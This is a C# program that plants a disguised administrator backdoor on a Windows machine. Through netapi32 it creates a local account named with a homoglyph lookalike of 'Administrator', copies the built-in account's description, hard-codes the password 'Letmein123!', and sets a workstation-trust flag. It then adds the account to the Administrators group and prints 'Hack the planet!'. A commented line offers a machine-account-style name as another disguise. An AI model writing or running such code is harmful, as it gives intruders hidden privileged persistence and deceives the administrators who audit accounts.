using System;
using System.DirectoryServices.AccountManagement;
using System.Runtime.InteropServices;

namespace doucme
{
    class Program
    {
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int NetUserAdd([MarshalAs(UnmanagedType.LPWStr)] string servername, UInt32 level, USER_INFO_1 userInfo, out UInt32 parm_err);

        [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int NetUserDel([MarshalAs(UnmanagedType.LPWStr)] string servername, [MarshalAs(UnmanagedType.LPWStr)] string username);


        public struct USER_INFO_1
        {
            [MarshalAs(UnmanagedType.LPWStr)] public string sUsername;
            [MarshalAs(UnmanagedType.LPWStr)] public string sPassword;
            public uint uiPasswordAge;
            public uint uiPriv;
            [MarshalAs(UnmanagedType.LPWStr)] public string sHome_Dir;
            [MarshalAs(UnmanagedType.LPWStr)] public string sComment;
            public uint uiFlags;
            [MarshalAs(UnmanagedType.LPWStr)] public string sScript_Path;
        }

        const uint USER_PRIV_USER = 1;
        const uint UF_WORKSTATION_TRUST_ACCOUNT = 0x1000;
        const string PASSWORD = "Letmein123!";

        const string USERNAME = "Aԁmіnistratοr"; // Homoglyph's!
        const string DESCRIPTION = "Built-in account for administering the computer/domain";
        //const string USERNAME = "NSA0XF$"; // Machine Name!

        static void Main(string[] args)
        {
            //NetUserDel("", USERNAME);
            USER_INFO_1 newuser = new USER_INFO_1()
            {
                sComment = DESCRIPTION,
                sUsername = USERNAME,
                sPassword = PASSWORD,
                sHome_Dir = "",
                sScript_Path = "",
                uiPriv = USER_PRIV_USER,
                uiFlags = UF_WORKSTATION_TRUST_ACCOUNT
            };
            Console.WriteLine(string.Format("Adding {0} user to system with password {1}, please wait...", USERNAME, PASSWORD));
            NetUserAdd("", 1, newuser, out uint parm_err);
            Console.WriteLine("User added!");
            Console.WriteLine("Enumerating Administrators group, please wait...");
            GroupPrincipal gp = GroupPrincipal.FindByIdentity(new PrincipalContext(ContextType.Machine, null), "Administrators");
            Console.WriteLine("Found Administrators group.");
            Console.WriteLine("Enumerating new user, please wait...");
            UserPrincipal up = UserPrincipal.FindByIdentity(new PrincipalContext(ContextType.Machine, null), USERNAME);
            Console.WriteLine("Found the new user.");
            Console.WriteLine(string.Format("Adding {0} to Administrators group, please wait...", USERNAME));
            gp.Members.Add(up);
            gp.Save();
            Console.WriteLine("All Done! Hack the planet!");
        }
    }
}
